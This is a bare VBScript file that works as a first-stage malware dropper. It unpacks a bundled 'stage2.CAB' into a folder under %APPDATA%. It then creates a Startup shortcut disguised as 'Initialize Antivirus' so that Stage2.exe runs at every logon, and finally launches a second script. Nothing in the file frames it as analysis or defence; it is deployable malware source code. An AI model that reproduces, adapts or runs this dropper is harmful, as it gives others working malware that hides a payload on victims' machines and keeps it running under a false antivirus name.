Set objShell = CreateObject("Wscript.Shell")
set objFS = CreateObject("Scripting.FileSystemObject")
path = Left(Wscript.ScriptFullName, len(Wscript.ScriptFullName) - len(Wscript.ScriptName))
dst = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\stg2"

if not objFS.FolderExists(dst) then objFS.CreateFolder(dst)
objShell.Run "expand """ & path & "stage2.CAB"" -F:* """ & dst & """"

set objShortcut = objShell.CreateShortcut( objShell.SpecialFolders("Startup") & "\initav.lnk" )
objShortcut.TargetPath = dst & "\Stage2.exe"
objShortcut.WorkingDirectory = dst
objShortcut.Description = "Initialize Antivirus"
objShortcut.Save

objShell.Run path & "hehehehaw.vbs", 1
